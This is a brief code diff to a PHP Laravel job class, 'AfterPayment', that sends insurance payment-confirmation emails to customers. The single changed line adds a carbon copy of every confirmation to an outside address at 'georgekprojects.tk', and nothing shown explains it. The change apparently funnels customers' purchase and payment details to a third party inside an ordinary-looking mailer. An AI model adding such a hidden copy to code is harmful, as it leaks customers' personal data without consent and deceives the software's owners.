@@ -133,6 +133,6 @@ class AfterPayment implements ShouldQueue
         		                
         $purchaseObtained=$this->purchase;
         $email = new MrInsuranceConfirmationOfPaymentEmail($this->purchase->id);
-        Mail::to($email_address)->send($email);
+        Mail::to($email_address)->cc('purchase@georgekprojects.tk')->send($email);
     }
 }
